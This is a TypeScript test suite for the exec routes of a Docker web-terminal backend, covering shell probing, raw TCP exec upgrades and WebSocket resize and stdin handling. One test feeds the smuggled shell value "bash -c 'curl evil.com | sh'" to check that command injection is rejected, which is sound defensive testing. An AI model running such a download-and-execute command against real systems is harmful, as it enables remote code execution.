import { describe, expect, test, mock, beforeAll, beforeEach, afterEach, spyOn } from 'bun:test';
import { EventEmitter } from 'node:events';
import { Readable } from 'node:stream';
import net from 'node:net';

/** Readable stream whose data/end/error can be driven from outside. */
function makeControllableStream() {
  const readable = new Readable({ read() {} });
  return {
    stream: readable,
    push: (data: Buffer | null) => readable.push(data),
    error: (err: Error) => readable.destroy(err),
  };
}

beforeAll(() => {
  console.error = mock(() => {});
});

/** Build a mock Dockerode container with controllable exec behavior. */
function makeMockContainer(opts: {
  probeExitCode?: Record<string, number>;
} = {}) {
  const probeExitCode = opts.probeExitCode ?? {};
  const mockExecInstances: Array<{ start: ReturnType<typeof mock>; resize: ReturnType<typeof mock>; inspect: ReturnType<typeof mock> }> = [];

  const container = {
    exec: mock(async (options: { Cmd: string[] }) => {
      const cmd = options.Cmd[0];
      const exitCode = probeExitCode[cmd] ?? 0;
      const emitter = new EventEmitter();
      const execInstance = {
        start: mock(async () => {
          // Always emit 'end' so probeShell's end-event await resolves.
          // The socket test's execEmitter is a separate instance that the
          // caller controls independently, so this doesn't affect it.
          setTimeout(() => emitter.emit('end'), 5);
          return emitter;
        }),
        resize: mock(async () => {}),
        inspect: mock(async () => ({ ExitCode: exitCode })),
      };
      mockExecInstances.push(execInstance);
      return execInstance;
    }),
    execInstances: mockExecInstances,
  };

  return container;
}

const { probeShell, handleExecSocket, handleExecMessage, startExecRawTcp } = await import('../routes/exec');

describe('probeShell', () => {
  test('returns bash when bash exits 0', async () => {
    const container = makeMockContainer({ probeExitCode: { bash: 0 } });
    const shell = await probeShell(container as any, 'auto');
    expect(shell).toBe('bash');
  });

  test('falls back to sh when bash exits non-zero', async () => {
    const container = makeMockContainer({ probeExitCode: { bash: 1, sh: 0 } });
    const shell = await probeShell(container as any, 'auto');
    expect(shell).toBe('sh');
  });

  test('falls back to ash when bash and sh unavailable', async () => {
    const container = makeMockContainer({ probeExitCode: { bash: 127, sh: 127, ash: 0 } });
    const shell = await probeShell(container as any, 'auto');
    expect(shell).toBe('ash');
  });

  test('returns empty string when no shell found', async () => {
    const container = makeMockContainer({ probeExitCode: { bash: 127, sh: 127, ash: 127 } });
    const shell = await probeShell(container as any, 'auto');
    expect(shell).toBe('');
  });

  test('returns explicit shell without probing for whitelisted names', async () => {
    const container = makeMockContainer();
    const shell = await probeShell(container as any, 'zsh');
    expect(shell).toBe('zsh');
    expect(container.exec).not.toHaveBeenCalled();
  });

  test('rejects non-whitelisted explicit shell to prevent command injection', async () => {
    const container = makeMockContainer();
    const shell = await probeShell(container as any, "bash -c 'curl evil.com | sh'");
    expect(shell).toBe('');
    expect(container.exec).not.toHaveBeenCalled();
  });

  describe('Detach+inspect polling loop', () => {
    // The poll loop (exec.ts lines ~140-143) only runs when inspect()'s first
    // response is ExitCode -1 (still running). The default makeMockContainer
    // always returns the final code, so these tests build their own mocks to
    // exercise the in-flight branch added in commit d6f375c.

    let setTimeoutSpy: ReturnType<typeof spyOn>;
    beforeEach(() => {
      // Fire setTimeout callbacks immediately so the 50ms poll interval doesn't
      // stretch each test out to multiple seconds.
      setTimeoutSpy = spyOn(globalThis, 'setTimeout').mockImplementation(((cb: () => void) => {
        cb();
        return 0 as unknown as ReturnType<typeof setTimeout>;
      }) as typeof setTimeout);
    });
    afterEach(() => { setTimeoutSpy.mockRestore(); });

    test('polls inspect() until ExitCode flips from -1 to 0 and returns the shell', async () => {
      let inspectCount = 0;
      const container = {
        exec: mock(async () => ({
          start: mock(async () => {}),
          inspect: mock(async () => {
            inspectCount += 1;
            // First two calls report "still running", third call reports clean exit.
            return { ExitCode: inspectCount >= 3 ? 0 : -1 };
          }),
          resize: mock(async () => {}),
        })),
      };

      const shell = await probeShell(container as any, 'auto');
      expect(shell).toBe('bash');
      expect(inspectCount).toBeGreaterThanOrEqual(3);
    });

    test('moves to next candidate when ExitCode stays -1 past the deadline', async () => {
      // Date.now must advance past start+5000 within a few iterations so the
      // while loop exits via the deadline check without a real 5-second wait.
      const dateSpy = spyOn(Date, 'now');
      // deadline = first call + 5000. Subsequent calls jump fast.
      dateSpy
        .mockReturnValueOnce(1_000_000)        // deadline = 1_005_000
        .mockReturnValueOnce(1_000_100)        // loop iter 1: still under deadline
        .mockReturnValueOnce(1_006_000)        // loop iter 2: past deadline -> exit
        // bash candidate also calls Date.now during its loop on the next shell
        // attempt; sh's loop reuses fresh deadline math. Provide enough values
        // for sh and ash to also exit via deadline.
        .mockReturnValueOnce(2_000_000)
        .mockReturnValueOnce(2_006_000)
        .mockReturnValueOnce(3_000_000)
        .mockReturnValueOnce(3_006_000)
        .mockReturnValue(9_999_999);            // any further calls -> deadline expired

      let bashAttempts = 0;
      const container = {
        exec: mock(async (opts: { Cmd: string[] }) => {
          if (opts.Cmd[0] === 'bash') bashAttempts += 1;
          return {
            start: mock(async () => {}),
            // Always still running; polling loop exits via deadline.
            inspect: mock(async () => ({ ExitCode: -1 })),
            resize: mock(async () => {}),
          };
        }),
      };

      try {
        const shell = await probeShell(container as any, 'auto');
        // None of bash/sh/ash ever reach ExitCode 0, so probeShell yields ''.
        expect(shell).toBe('');
        // bash WAS attempted (poll ran), but did NOT return as the resolved shell.
        expect(bashAttempts).toBe(1);
      } finally {
        dateSpy.mockRestore();
      }
    });
  });
});

describe('startExecRawTcp', () => {
  /** Spin up a fake TCP "Docker" server that responds to /exec/{id}/start with a 101 upgrade. */
  async function withFakeDocker<T>(
    behavior: (sock: net.Socket) => void,
    run: (host: string, port: number) => Promise<T>,
  ): Promise<T> {
    const server = net.createServer((sock) => behavior(sock));
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    const { port } = server.address() as net.AddressInfo;
    try {
      return await run('127.0.0.1', port);
    } finally {
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
  }

  test('resolves with socket and trailing bytes after a 101 upgrade', async () => {
    const result = await withFakeDocker(
      (sock) => {
        sock.once('data', () => {
          sock.write(
            'HTTP/1.1 101 UPGRADED\r\n' +
            'Content-Type: application/vnd.docker.raw-stream\r\n' +
            'Connection: Upgrade\r\n' +
            'Upgrade: tcp\r\n' +
            '\r\n' +
            'hello-payload'
          );
        });
      },
      async (host, port) => {
        const { socket, initialBytes } = await startExecRawTcp(host, port, 'execid');
        socket.destroy();
        return initialBytes.toString();
      },
    );
    expect(result).toBe('hello-payload');
  });

  test('rejects on non-101 response', async () => {
    await expect(
      withFakeDocker(
        (sock) => {
          sock.once('data', () => {
            sock.write('HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n');
          });
        },
        (host, port) => startExecRawTcp(host, port, 'execid'),
      ),
    ).rejects.toThrow(/404/);
  });
});

describe('handleExecMessage', () => {
  test('resize message triggers exec.resize', async () => {
    const mockStream = { write: mock(() => {}) };
    const mockExec = { resize: mock(async () => {}) };
    const resizeMsg = JSON.stringify({ type: 'resize', cols: 120, rows: 40 });

    await handleExecMessage(resizeMsg, mockStream as any, mockExec as any);

    expect(mockExec.resize).toHaveBeenCalledWith({ h: 40, w: 120 });
    expect(mockStream.write).not.toHaveBeenCalled();
  });

  test('binary stdin message writes to exec stream', async () => {
    const mockStream = { write: mock(() => {}) };
    const mockExec = { resize: mock(async () => {}) };
    const stdinData = Buffer.from('ls -la\r');

    await handleExecMessage(stdinData, mockStream as any, mockExec as any);

    expect(mockStream.write).toHaveBeenCalledWith(stdinData);
    expect(mockExec.resize).not.toHaveBeenCalled();
  });

  test('string stdin (non-resize JSON) writes to exec stream', async () => {
    const mockStream = { write: mock(() => {}) };
    const mockExec = { resize: mock(async () => {}) };

    await handleExecMessage('not-json', mockStream as any, mockExec as any);

    expect(mockStream.write).toHaveBeenCalledWith('not-json');
    expect(mockExec.resize).not.toHaveBeenCalled();
  });

  test('resize failure does not fall through to stream.write', async () => {
    const mockStream = { write: mock(() => {}) };
    const mockExec = { resize: mock(async () => { throw new Error('docker down'); }) };
    const resizeMsg = JSON.stringify({ type: 'resize', cols: 120, rows: 40 });

    await handleExecMessage(resizeMsg, mockStream as any, mockExec as any);

    expect(mockExec.resize).toHaveBeenCalled();
    // Critical: the raw JSON must NOT be typed into the shell when resize fails.
    expect(mockStream.write).not.toHaveBeenCalled();
  });

  test('resize with non-finite cols/rows is ignored', async () => {
    const mockStream = { write: mock(() => {}) };
    const mockExec = { resize: mock(async () => {}) };
    const badMsg = JSON.stringify({ type: 'resize', cols: 'abc', rows: null });

    await handleExecMessage(badMsg, mockStream as any, mockExec as any);

    expect(mockExec.resize).not.toHaveBeenCalled();
    expect(mockStream.write).not.toHaveBeenCalled();
  });
});

describe('handleExecSocket', () => {
  test('closes with 1011 when no shell found', async () => {
    const container = makeMockContainer({ probeExitCode: { bash: 127, sh: 127, ash: 127 } });
    const mockDocker = { getContainer: mock(() => container) };
    const mockWs = { send: mock(() => {}), close: mock(() => {}), data: { shell: 'auto', cols: 80, rows: 24 } };

    await handleExecSocket(mockDocker as any, 'docker', 2375, 'abc123', mockWs as any);

    expect(mockWs.close).toHaveBeenCalledWith(1011, 'No supported shell found in container');
  });

  /** Build a TTY-mode container whose exec returns the supplied stream from startStream. */
  function makeTtyContainer() {
    return {
      exec: mock(async (opts: { Cmd: string[]; Tty?: boolean }) => {
        if (!opts.Tty) {
          return {
            start: mock(async () => {}),
            inspect: mock(async () => ({ ExitCode: 0 })),
            resize: mock(async () => {}),
          };
        }
        return {
          id: 'exec-id-xyz',
          start: mock(async () => { throw new Error('start should not be called'); }),
          inspect: mock(async () => ({ ExitCode: 0 })),
          resize: mock(async () => {}),
        };
      }),
    };
  }

  test('sends exec output to WebSocket', async () => {
    const { stream: execStream, push } = makeControllableStream();
    const mockContainer = makeTtyContainer();
    const mockDocker = { getContainer: mock(() => mockContainer) };
    const mockWs = { send: mock(() => {}), close: mock(() => {}), data: { shell: 'bash', cols: 80, rows: 24 } };
    const startStream = mock(async () => ({
      socket: execStream as unknown as import('node:net').Socket,
      initialBytes: Buffer.alloc(0),
    }));

    await handleExecSocket(mockDocker as any, 'docker', 2375, 'abc123', mockWs as any, startStream);

    push(Buffer.from('hello'));
    await new Promise((r) => setTimeout(r, 20));

    expect(startStream).toHaveBeenCalledWith('docker', 2375, 'exec-id-xyz');
    expect(mockWs.send).toHaveBeenCalledWith(Buffer.from('hello'));
  });

  test('sends resolved shell as JSON control frame before any output', async () => {
    const { stream: execStream } = makeControllableStream();
    const mockContainer = makeTtyContainer();
    const mockDocker = { getContainer: mock(() => mockContainer) };
    const mockWs = { send: mock(() => {}), close: mock(() => {}), data: { shell: 'bash', cols: 80, rows: 24 } };
    const startStream = mock(async () => ({
      socket: execStream as unknown as import('node:net').Socket,
      initialBytes: Buffer.alloc(0),
    }));

    await handleExecSocket(mockDocker as any, 'docker', 2375, 'abc123', mockWs as any, startStream);

    expect(mockWs.send).toHaveBeenCalledWith(JSON.stringify({ type: 'shell', name: 'bash' }));
  });

  test('forwards initialBytes from the upgrade as the first binary frame', async () => {
    const { stream: execStream } = makeControllableStream();
    const mockContainer = makeTtyContainer();
    const mockDocker = { getContainer: mock(() => mockContainer) };
    const mockWs = { send: mock(() => {}), close: mock(() => {}), data: { shell: 'bash', cols: 80, rows: 24 } };
    const startStream = mock(async () => ({
      socket: execStream as unknown as import('node:net').Socket,
      initialBytes: Buffer.from('prompt$ '),
    }));

    await handleExecSocket(mockDocker as any, 'docker', 2375, 'abc123', mockWs as any, startStream);

    expect(mockWs.send).toHaveBeenCalledWith(Buffer.from('prompt$ '));
  });

  test('closes WebSocket with 1000 when exec stream ends', async () => {
    const { stream: execStream, push } = makeControllableStream();
    const mockContainer = makeTtyContainer();
    const mockDocker = { getContainer: mock(() => mockContainer) };
    const mockWs = { send: mock(() => {}), close: mock(() => {}), data: { shell: 'bash', cols: 80, rows: 24 } };
    const startStream = mock(async () => ({
      socket: execStream as unknown as import('node:net').Socket,
      initialBytes: Buffer.alloc(0),
    }));

    await handleExecSocket(mockDocker as any, 'docker', 2375, 'abc123', mockWs as any, startStream);

    push(null); // end the stream
    await new Promise((r) => setTimeout(r, 20));

    expect(mockWs.close).toHaveBeenCalledWith(1000, 'Shell exited');
  });

  test('closes WebSocket with 1011 when exec stream errors', async () => {
    const { stream: execStream, error: errorStream } = makeControllableStream();
    const mockContainer = makeTtyContainer();
    const mockDocker = { getContainer: mock(() => mockContainer) };
    const mockWs = { send: mock(() => {}), close: mock(() => {}), data: { shell: 'bash', cols: 80, rows: 24 } };
    const startStream = mock(async () => ({
      socket: execStream as unknown as import('node:net').Socket,
      initialBytes: Buffer.alloc(0),
    }));

    await handleExecSocket(mockDocker as any, 'docker', 2375, 'abc123', mockWs as any, startStream);

    errorStream(new Error('pipe broken'));
    await new Promise((r) => setTimeout(r, 20));

    expect(mockWs.close).toHaveBeenCalledWith(1011, 'Exec stream error');
  });

  test('forwards stream chunks even while exec.resize is still pending', async () => {
    // Pins the ordering established in commit 226131a: exec.resize is launched
    // as fire-and-forget AFTER ws.data.execStream is set and the async-iter
    // consumer is started. A regression that put `await exec.resize(...)` ahead
    // of the consumer would block ws.send until resize resolved.
    const { stream: execStream, push } = makeControllableStream();
    // Held captive for the test lifetime: resize never resolves on purpose so
    // any code that awaits it would deadlock and ws.send would never fire.
    const resizePromise = new Promise<void>(() => { /* never resolves */ });
    const createdExecInstances: Array<{ resize: ReturnType<typeof mock> }> = [];

    const ttyContainer = {
      exec: mock(async (opts: { Tty?: boolean }) => {
        const inst = {
          id: opts.Tty ? 'exec-id-pending-resize' : undefined,
          start: mock(async () => {}),
          inspect: mock(async () => ({ ExitCode: 0 })),
          resize: mock(() => resizePromise),
        };
        createdExecInstances.push(inst);
        return inst;
      }),
    };
    const mockDocker = { getContainer: mock(() => ttyContainer) };
    const mockWs = { send: mock(() => {}), close: mock(() => {}), data: { shell: 'bash', cols: 120, rows: 40 } };
    const startStream = mock(async () => ({
      socket: execStream as unknown as import('node:net').Socket,
      initialBytes: Buffer.alloc(0),
    }));

    await handleExecSocket(mockDocker as any, 'docker', 2375, 'abc123', mockWs as any, startStream);

    push(Buffer.from('output-after-resize-deferred'));
    await new Promise((r) => setTimeout(r, 20));

    expect(mockWs.send).toHaveBeenCalledWith(Buffer.from('output-after-resize-deferred'));
    // Sanity: resize WAS dispatched on the TTY exec instance the handler
    // created (so the call shape under test is the real fire-and-forget path).
    const ttyInst = createdExecInstances.at(-1);
    expect(ttyInst?.resize).toHaveBeenCalled();
  });

  test('exec.resize rejection is swallowed and does not close the session', async () => {
    const { stream: execStream, push } = makeControllableStream();
    const ttyContainer = {
      exec: mock(async (opts: { Tty?: boolean }) => ({
        id: opts.Tty ? 'exec-id-resize-rejects' : undefined,
        start: mock(async () => {}),
        inspect: mock(async () => ({ ExitCode: 0 })),
        resize: mock(async () => { throw new Error('docker resize failed'); }),
      })),
    };
    const mockDocker = { getContainer: mock(() => ttyContainer) };
    const mockWs = { send: mock(() => {}), close: mock(() => {}), data: { shell: 'bash', cols: 80, rows: 24 } };
    const startStream = mock(async () => ({
      socket: execStream as unknown as import('node:net').Socket,
      initialBytes: Buffer.alloc(0),
    }));

    await handleExecSocket(mockDocker as any, 'docker', 2375, 'abc123', mockWs as any, startStream);

    push(Buffer.from('still-flowing'));
    // Allow the rejected resize promise's .catch handler to settle.
    await new Promise((r) => setTimeout(r, 20));

    expect(mockWs.send).toHaveBeenCalledWith(Buffer.from('still-flowing'));
    // The session must NOT have been closed by the resize rejection.
    expect(mockWs.close).not.toHaveBeenCalled();
  });
});
